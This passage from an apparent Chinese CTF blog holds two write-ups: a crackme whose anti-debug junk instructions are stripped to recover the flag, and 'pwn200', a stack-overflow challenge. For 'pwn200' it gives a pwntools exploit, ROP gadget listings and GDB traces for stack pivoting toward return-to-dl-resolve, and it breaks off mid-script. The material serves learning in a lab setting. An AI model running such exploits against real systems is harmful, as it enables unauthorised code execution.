class="number">0x4009a4</span> &lt;main+<span class="number">324</span>&gt;    call   func3 &lt;<span class="number">0x400e20</span>&gt;</span><br><span class="line"> </span><br><span class="line">   <span class="number">0x4009a9</span> &lt;main+<span class="number">329</span>&gt;    call   main+<span class="number">334</span> &lt;<span class="number">0x4009ae</span>&gt;</span><br><span class="line"> </span><br><span class="line">   <span class="number">0x4009ae</span> &lt;main+<span class="number">334</span>&gt;    pop    rax</span><br><span class="line">   <span class="number">0x4009af</span> &lt;main+<span class="number">335</span>&gt;    add    rax, <span class="number">0xa</span></span><br><span class="line"> ► <span class="number">0x4009b3</span> &lt;main+<span class="number">339</span>&gt;    jmp    rax &lt;<span class="number">0x4009b8</span>&gt;</span><br><span class="line">    ↓</span><br><span class="line">   <span class="number">0x4009b8</span> &lt;main+<span class="number">344</span>&gt;    call   main+<span class="number">349</span> &lt;<span class="number">0x4009bd</span>&gt;</span><br></pre></td></tr></table></figure><p>可以发现其实<strong>0x4009b3</strong>是<strong>jump</strong>到了<strong>0x4009b8</strong>处，我们在<strong>IDA</strong>里面修改即可</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000004009B3                 jmp     short loc_4009B8 ; Keypatch modified this from:</span><br><span class="line">.text:00000000004009B3                                         ;   jmp rax</span><br></pre></td></tr></table></figure><p>在这之前我们可以选定被花指令隐藏的数据按<strong>U</strong>或者右键选择“<strong>Undefine</strong>“先还原成数据，然后之后可以按”<strong>C</strong>“或者右键”<strong>Code</strong>“变成指令代码</p><p>继续运行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">  0x4009bd &lt;main+349&gt;    pop    rbx</span><br><span class="line">  0x4009be &lt;main+350&gt;    add    rbx, 0xa</span><br><span class="line">► 0x4009c2 &lt;main+354&gt;    jmp    rbx &lt;0x4009c7&gt;</span><br><span class="line">   ↓</span><br><span class="line">  0x4009c7 &lt;main+359&gt;    lea    rdi, [rsp + 8]</span><br></pre></td></tr></table></figure><p><strong>0x4009c2</strong>到<strong>0x4009c7</strong>，其实这时候我们分析一下这些花指令，本质上就是跳转到<strong>rbx+0xa</strong>的内存上</p><figure class="highlight cc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x4009bd</span> &lt;main+<span class="number">349</span>&gt;    pop    rbx</span><br><span class="line"><span class="number">0x4009be</span> &lt;main+<span class="number">350</span>&gt;    add    rbx, <span class="number">0xa</span></span><br><span class="line"><span class="number">0x4009c2</span> &lt;main+<span class="number">354</span>&gt;    jmp    rbx</span><br></pre></td></tr></table></figure><p>再看一下这段，加加减减等于没有，然后异或同一个寄存器一定会跳转</p><figure class="highlight cc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">  <span class="number">0x4009e1</span> &lt;main+<span class="number">385</span>&gt;    inc    eax</span><br><span class="line">  <span class="number">0x4009e3</span> &lt;main+<span class="number">387</span>&gt;    dec    eax</span><br><span class="line">  <span class="number">0x4009e5</span> &lt;main+<span class="number">389</span>&gt;    mov    ax, <span class="number">0x5eb</span></span><br><span class="line">► <span class="number">0x4009e9</span> &lt;main+<span class="number">393</span>&gt;    xor    eax, eax</span><br><span class="line">  <span class="number">0x4009eb</span> &lt;main+<span class="number">395</span>&gt;    je     main+<span class="number">391</span> &lt;<span class="number">0x4009e7</span>&gt;</span><br></pre></td></tr></table></figure><p>最终逆向完毕的版本</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> *v3; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// er12</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v5; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v6; <span class="comment">// ebp</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// edi</span></span><br><span class="line">  <span class="keyword">__pid_t</span> v8; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">__pid_t</span> v9; <span class="comment">// er13</span></span><br><span class="line">  __int64 correct_count; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> input[<span class="number">19</span>]; <span class="comment">// [rsp+0h] [rbp-4D8h]</span></span><br><span class="line">  <span class="keyword">char</span> v14; <span class="comment">// [rsp+4Ch] [rbp-48Ch]</span></span><br><span class="line">  <span class="keyword">int</span> enc[<span class="number">19</span>]; <span class="comment">// [rsp+50h] [rbp-488h]</span></span><br><span class="line">  <span class="keyword">char</span> v16; <span class="comment">// [rsp+A0h] [rbp-438h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v17; <span class="comment">// [rsp+4A8h] [rbp-30h]</span></span><br><span class="line"></span><br><span class="line">  v3 = input;</span><br><span class="line">  v17 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v4 = time(<span class="number">0L</span>L);</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    ++v3;</span><br><span class="line">    *(v3 - <span class="number">1</span>) = _IO_getc(_bss_start);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v3 != (<span class="keyword">int</span> *)&amp;v14 );</span><br><span class="line">  enc[<span class="number">0</span>] = <span class="string">'S'</span>;</span><br><span class="line">  enc[<span class="number">1</span>] = <span class="string">'@'</span>;</span><br><span class="line">  enc[<span class="number">2</span>] = <span class="string">'y'</span>;</span><br><span class="line">  enc[<span class="number">3</span>] = <span class="string">'R'</span>;</span><br><span class="line">  enc[<span class="number">4</span>] = <span class="string">'t'</span>;</span><br><span class="line">  enc[<span class="number">5</span>] = <span class="string">'f'</span>;</span><br><span class="line">  enc[<span class="number">6</span>] = <span class="string">'T'</span>;</span><br><span class="line">  enc[<span class="number">7</span>] = <span class="string">'l'</span>;</span><br><span class="line">  enc[<span class="number">8</span>] = <span class="string">'0'</span>;</span><br><span class="line">  enc[<span class="number">9</span>] = <span class="string">'+'</span>;</span><br><span class="line">  enc[<span class="number">10</span>] = <span class="string">'a'</span>;</span><br><span class="line">  enc[<span class="number">11</span>] = <span class="string">'g'</span>;</span><br><span class="line">  enc[<span class="number">12</span>] = <span class="string">'-'</span>;</span><br><span class="line">  enc[<span class="number">13</span>] = <span class="string">'L'</span>;</span><br><span class="line">  enc[<span class="number">14</span>] = <span class="string">'_'</span>;</span><br><span class="line">  enc[<span class="number">15</span>] = <span class="string">'3'</span>;</span><br><span class="line">  enc[<span class="number">16</span>] = <span class="string">'M'</span>;</span><br><span class="line">  enc[<span class="number">17</span>] = <span class="string">'&#125;'</span>;</span><br><span class="line">  enc[<span class="number">18</span>] = <span class="string">'&#123;'</span>;</span><br><span class="line">  func3(&amp;input[<span class="number">5</span>], <span class="number">2u</span>, <span class="number">7</span>, <span class="number">0xE</span>u);</span><br><span class="line">  func3(&amp;input[<span class="number">2</span>], <span class="number">4u</span>, <span class="number">6</span>, <span class="number">0x11</span>u);</span><br><span class="line">  func3(&amp;input[<span class="number">9</span>], <span class="number">3u</span>, <span class="number">5</span>, <span class="number">0xA</span>u);</span><br><span class="line">  v5 = getppid();</span><br><span class="line">  v6 = get_name_by_pid(v5, &amp;v16);</span><br><span class="line">  <span class="keyword">if</span> ( !v6 )</span><br><span class="line">  &#123;</span><br><span class="line">    func3(input, <span class="number">6u</span>, <span class="number">9</span>, <span class="number">0xF</span>u);</span><br><span class="line">    func3(&amp;input[<span class="number">11</span>], <span class="number">3u</span>, <span class="number">6</span>, <span class="number">8u</span>);</span><br><span class="line">    v7 = (<span class="keyword">unsigned</span> __int64)time(<span class="number">0L</span>L) - v4;</span><br><span class="line">    <span class="keyword">if</span> ( v7 &lt; <span class="number">2</span> )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_16;</span><br><span class="line">    func3(&amp;input[<span class="number">5</span>], <span class="number">1u</span>, <span class="number">5</span>, <span class="number">0xE</span>u);</span><br><span class="line">    v8 = getpid();</span><br><span class="line">    v9 = getsid(v8);</span><br><span class="line">    <span class="keyword">if</span> ( v9 != getppid() )</span><br><span class="line">    &#123;</span><br><span class="line">      func3(input, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0x13</span>u);</span><br><span class="line">      func3(&amp;input[<span class="number">3</span>], <span class="number">3u</span>, <span class="number">5</span>, <span class="number">0x10</span>u);</span><br><span class="line">      func3(&amp;input[<span class="number">15</span>], <span class="number">1u</span>, <span class="number">3</span>, <span class="number">4u</span>);</span><br><span class="line">      func3(&amp;input[<span class="number">8</span>], <span class="number">3u</span>, <span class="number">6</span>, <span class="number">0xB</span>u);</span><br><span class="line">      func3(input, <span class="number">0</span>, <span class="number">7</span>, <span class="number">0x13</span>u);</span><br><span class="line">      func3(&amp;input[<span class="number">16</span>], <span class="number">0</span>, <span class="number">2</span>, <span class="number">3u</span>);</span><br><span class="line">      func3(&amp;input[<span class="number">10</span>], <span class="number">0</span>, <span class="number">2</span>, <span class="number">9u</span>);</span><br><span class="line">      v7 = (<span class="keyword">unsigned</span> __int64)time(<span class="number">0L</span>L) - v4;</span><br><span class="line">      <span class="keyword">if</span> ( v7 &gt;= <span class="number">3</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        correct_count = <span class="number">0L</span>L;</span><br><span class="line">        func3(&amp;input[<span class="number">11</span>], <span class="number">1u</span>, <span class="number">3</span>, <span class="number">8u</span>);</span><br><span class="line">        func3(&amp;input[<span class="number">16</span>], <span class="number">0</span>, <span class="number">2</span>, <span class="number">3u</span>);</span><br><span class="line">        <span class="keyword">for</span> ( i = <span class="string">'S'</span>; i == input[correct_count]; i = enc[correct_count] )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( ++correct_count == <span class="number">19</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">"win"</span>);</span><br><span class="line">            <span class="keyword">goto</span> LABEL_12;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"You failed"</span>);</span><br><span class="line">        v7 = correct_count;</span><br><span class="line">      &#125;</span><br><span class="line">LABEL_16:</span><br><span class="line">      <span class="built_in">exit</span>(v7);</span><br><span class="line">    &#125;</span><br><span class="line">LABEL_17:</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"what are you doing?!"</span>);</span><br><span class="line">    v7 = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_16;</span><br><span class="line">  &#125;</span><br><span class="line">  v6 = <span class="number">-1</span>;</span><br><span class="line">LABEL_12:</span><br><span class="line">  result = v6;</span><br><span class="line">  <span class="keyword">if</span> ( __readfsqword(<span class="number">0x28</span>u) != v17 )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_17;c</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> 输入字符串“0123456789abcdefghi”，然后在比较处设断点，可以看到输入字符串经过处理后的结果是“8f6c90e1dg237abh5i4”。<br>然后即可写脚本，把“S@yRtfTl0+ag-L_3M}{”进行还原。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">str = <span class="string">"0123456789abcdefghi"</span></span><br><span class="line">str1 = <span class="string">"8f6c90e1dg237abh5i4"</span></span><br><span class="line">str2 = <span class="string">"S@yRtfTl0+ag-L_3M&#125;&#123;"</span></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(str2)):</span><br><span class="line">flag += str2[str1.find(str[i])]</span><br><span class="line"><span class="keyword">print</span> flag</span><br></pre></td></tr></table></figure><p> 得到flag为flag{My-StL_R0T@+3} </p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>pwn200</title>
      <link href="/2019/10/15/pwn200/"/>
      <url>/2019/10/15/pwn200/</url>
      
        <content type="html"><![CDATA[<p>先检查一下文件</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386<span class="number">-32</span>-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      <span class="function">No <span class="title">PIE</span> <span class="params">(<span class="number">0x8048000</span>)</span></span></span><br></pre></td></tr></table></figure><p> 在 IDA中反汇编看看 程序是什么样的，这是我们发现程序存在漏洞</p><figure class="highlight cc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ssize_t</span> vuln()</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+Ch] [ebp-6Ch]</span></span><br><span class="line"></span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, &amp;buf);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, &amp;buf, <span class="number">0x100</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里存在着栈溢出漏洞，虽然程序存在 write 写函数 但是我要学会的是 return-to-dl-resolve 所以我们不利用write函数去泄露 </p><p>这道题首先为了让构造的 ROP 链的长度合适，这里我们可以用到栈迁移</p><ul><li>首先我们要 将我们想迁移到的地址 覆盖到 程序的 ebp 上这样 执行下一个 汇编指令时 会将 这个值 赋值给 <strong>ebp （pop ebp）</strong></li><li>然后我们要在下面调用一次 <strong>leave ret (mov esp, ebp ; pop ebp ;)</strong>这样我们就能将esp 也迁移过去 从而实现栈迁移 </li></ul><p>用<strong>ROPgadget</strong>工具找到 我们需要的汇编指令的地址</p><figure class="highlight cc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">syc@ubuntu:~/Downloads/retdll$ ROPgadget --binary bof --only 'pop|ret'</span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line"><span class="number">0x0804861b</span> : pop ebp ; ret</span><br><span class="line"><span class="number">0x08048618</span> : pop ebx ; pop esi ; pop edi ; pop ebp ; ret</span><br><span class="line"><span class="number">0x08048379</span> : pop ebx ; ret</span><br><span class="line"><span class="number">0x0804861a</span> : pop edi ; pop ebp ; ret</span><br><span class="line"><span class="number">0x08048619</span> : pop esi ; pop edi ; pop ebp ; ret</span><br><span class="line"><span class="number">0x08048362</span> : ret</span><br><span class="line"><span class="number">0x0804846e</span> : ret <span class="number">0xeac1</span></span><br><span class="line"></span><br><span class="line">Unique gadgets found: <span class="number">7</span></span><br><span class="line">syc@ubuntu:~/Downloads/retdll$ ROPgadget --binary bof --only 'leave|ret'</span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line"><span class="number">0x08048458</span> : leave ; ret</span><br><span class="line"><span class="number">0x08048362</span> : ret</span><br><span class="line"><span class="number">0x0804846e</span> : ret <span class="number">0xeac1</span></span><br><span class="line"></span><br><span class="line">Unique gadgets found: <span class="number">3</span></span><br><span class="line">syc@ubuntu:~/Downloads/retdll$ readelf -S bof | grep <span class="string">".bss"</span></span><br><span class="line">  [<span class="number">26</span>] .bss              NOBITS          <span class="number">0804</span>a040 <span class="number">001028</span> <span class="number">00000</span>c <span class="number">00</span>  WA  <span class="number">0</span>   <span class="number">0</span> <span class="number">32</span></span><br></pre></td></tr></table></figure><p>找到所需要的<strong>ROP</strong>链的部分，如果我们将<strong>payload</strong>写为下面这样运行就能实现栈迁移，将<strong>ebp</strong>覆盖为我们想要迁移过去的值 ，然后执行<strong>leave_ret</strong>就能将栈迁移过去 </p><p>具体的Exploit为</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">'./bof'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./bof'</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line"></span><br><span class="line">offset_ebp = <span class="number">0x6c</span></span><br><span class="line">ppp_ret = <span class="number">0x08048619</span> <span class="comment">#pop esi ; pop edi ; pop ebp ; ret</span></span><br><span class="line">pop_ebp_ret = <span class="number">0x0804861b</span> <span class="comment">#pop ebp ; ret</span></span><br><span class="line">leave_ret = <span class="number">0x08048458</span> <span class="comment">#leave ; ret</span></span><br><span class="line">bss_addr = <span class="number">0x0804a040</span> <span class="comment"># readelf -S pwn1 | grep ".bss"</span></span><br><span class="line">stack_size = <span class="number">0x800</span></span><br><span class="line">base_stage = bss_addr + stack_size</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'Welcome to XDCTF2015~!\n'</span>)</span><br><span class="line">payload = <span class="string">''</span></span><br><span class="line">payload+= <span class="string">'a'</span>*offset_ebp</span><br><span class="line">payload+= p32(base_stage)</span><br><span class="line">payload+= p32(leave_ret)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>GDB调试环节</p><figure class="highlight cc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[DEBUG] Received <span class="number">0x17</span> bytes:</span><br><span class="line">    'Welcome to XDCTF2015~!\n'</span><br><span class="line">[DEBUG] Sent <span class="number">0x75</span> bytes:</span><br><span class="line">    <span class="number">00000000</span>  <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span>  <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span>  <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span>  <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span>  │aaaa│aaaa│aaaa│aaaa│</span><br><span class="line">    *</span><br><span class="line">    <span class="number">00000060</span>  <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span>  <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span>  <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span>  <span class="number">40</span> a8 <span class="number">04</span> <span class="number">08</span>  │aaaa│aaaa│aaaa│@···│</span><br><span class="line">    <span class="number">00000070</span>  <span class="number">58</span> <span class="number">84</span> <span class="number">04</span> <span class="number">08</span>  <span class="number">0</span>a                                     │X···│·│</span><br><span class="line">    <span class="number">00000075</span></span><br></pre></td></tr></table></figure><p>发送payload后，EBP已经被覆盖为我们布置好的FakeStack地址了，也就bss段地址</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">─────────────────────────────────[ REGISTERS ]──────────────────────────────────</span><br><span class="line"> EAX  <span class="number">0x75</span></span><br><span class="line"> EBX  <span class="number">0x0</span></span><br><span class="line"> ECX  0xffe1207c ◂— 0x61616161 ('aaaa')</span><br><span class="line"> EDX  <span class="number">0x100</span></span><br><span class="line"> EDI  <span class="number">0xffe12160</span> —▸ <span class="number">0xffe12180</span> ◂— <span class="number">0x1</span></span><br><span class="line"> ESI  <span class="number">0xf7ef7000</span> (_GLOBAL_OFFSET_TABLE_) ◂— <span class="number">0x1b1db0</span></span><br><span class="line"> EBP  <span class="number">0x804a840</span> ◂— <span class="number">0x0</span></span><br><span class="line"> ESP  <span class="number">0xffe120ec</span> —▸ <span class="number">0x8048458</span> (deregister_tm_clones+<span class="number">40</span>) ◂— leave  </span><br><span class="line"> EIP  <span class="number">0x804851e</span> (vuln+<span class="number">51</span>) ◂— ret    </span><br><span class="line">───────────────────────────────────[ DISASM ]───────────────────────────────────</span><br><span class="line">   <span class="number">0x8048519</span> &lt;vuln+<span class="number">46</span>&gt;                    add    esp, <span class="number">0x10</span></span><br><span class="line">   <span class="number">0x804851c</span> &lt;vuln+<span class="number">49</span>&gt;                    nop    </span><br><span class="line">   <span class="number">0x804851d</span> &lt;vuln+<span class="number">50</span>&gt;                    leave  </span><br><span class="line"> ► <span class="number">0x804851e</span> &lt;vuln+<span class="number">51</span>&gt;                    ret             &lt;<span class="number">0x8048458</span>; deregister_tm_clones+<span class="number">40</span>&gt;</span><br><span class="line">    ↓</span><br><span class="line">   <span class="number">0x8048458</span> &lt;deregister_tm_clones+<span class="number">40</span>&gt;    leave  </span><br><span class="line">   <span class="number">0x8048459</span> &lt;deregister_tm_clones+<span class="number">41</span>&gt;    ret    </span><br><span class="line"> </span><br><span class="line">   <span class="number">0x804845b</span> &lt;deregister_tm_clones+<span class="number">43</span>&gt;    nop    </span><br><span class="line">   <span class="number">0x804845c</span> &lt;deregister_tm_clones+<span class="number">44</span>&gt;    lea    esi, [esi]</span><br><span class="line">   <span class="number">0x8048460</span> &lt;register_tm_clones&gt;         mov    eax, <span class="number">0x804a028</span></span><br><span class="line">   <span class="number">0x8048465</span> &lt;register_tm_clones+<span class="number">5</span>&gt;       sub    eax, <span class="number">0x804a028</span></span><br><span class="line">   <span class="number">0x804846a</span> &lt;register_tm_clones+<span class="number">10</span>&gt;      sar    eax, <span class="number">2</span></span><br></pre></td></tr></table></figure><p> ret地址为leave ret的地址，将EBP的值交给ESP从而达到栈迁移 ，此时ESP已经bss段上</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">─────────────────────────────────[ REGISTERS ]──────────────────────────────────</span><br><span class="line"> EAX  0x75</span><br><span class="line"> EBX  0x0</span><br><span class="line"> ECX  0xffe1207c ◂— 0x61616161 (&apos;aaaa&apos;)</span><br><span class="line"> EDX  0x100</span><br><span class="line"> EDI  0xffe12160 —▸ 0xffe12180 ◂— 0x1</span><br><span class="line"> ESI  0xf7ef7000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b1db0</span><br><span class="line"> EBP  0x0</span><br><span class="line"> ESP  0x804a844 ◂— 0x0</span><br><span class="line"> EIP  0x8048459 (deregister_tm_clones+41) ◂— ret    </span><br><span class="line">───────────────────────────────────[ DISASM ]───────────────────────────────────</span><br><span class="line">   0x8048519 &lt;vuln+46&gt;                    add    esp, 0x10</span><br><span class="line">   0x804851c &lt;vuln+49&gt;                    nop    </span><br><span class="line">   0x804851d &lt;vuln+50&gt;                    leave  </span><br><span class="line">   0x804851e &lt;vuln+51&gt;                    ret    </span><br><span class="line">    ↓</span><br><span class="line">   0x8048458 &lt;deregister_tm_clones+40&gt;    leave  </span><br><span class="line"> ► 0x8048459 &lt;deregister_tm_clones+41&gt;    ret    &lt;0&gt;</span><br></pre></td></tr></table></figure><p>查看一下栈的情况，已经实现了栈迁移</p><figure class="highlight cc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; <span class="built_in">stack</span> <span class="number">30</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ esp  <span class="number">0x804a844</span> ◂— <span class="number">0x0</span></span><br><span class="line">... ↓</span><br></pre></td></tr></table></figure><p>但是我们是想要让我们布置好的数据在这个<strong>fake stack</strong>上 </p><ul><li><p>我们就需要先到用<strong>read</strong>函数向这个地方写入<strong>ROP</strong>链从而能实现调用。因为又<strong>leave ret</strong>会有一个<strong>pop ebp</strong>所以在布置<strong>fake stack</strong>的时候我首先要输入对应大小的<strong>fake_ebp</strong></p></li><li><p>将我们要用到的<strong>ROP</strong>链布置到<strong>bss</strong>段上从而实现布置更长的<strong>ROP</strong>链。这样我们就知道如何去 控制我们需要的指令了</p><p>接着我们需要做的就是通过实现<strong>return-to-dl-resolv</strong>实现<strong>get shell</strong> </p></li><li><p>首先控制到PLT[0]修改我们函数的<strong>index_offset</strong>让其指向我们构造的<strong>fake_reloc</strong> </p></li><li><p>控制<strong>index_offset</strong> 的关键是我们只需要在<strong>PLT[0]</strong>的下一个栈地址放上<strong>index_offset</strong>就行 （因为<strong>index_offset</strong>是在<strong>call</strong>函数后<strong>Push</strong>进栈的地址刚好在返回<strong>PLT[0]</strong>时的栈顶） </p></li></ul><p>我们先写一个Exploit尝试在假栈上部署一下数据</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span 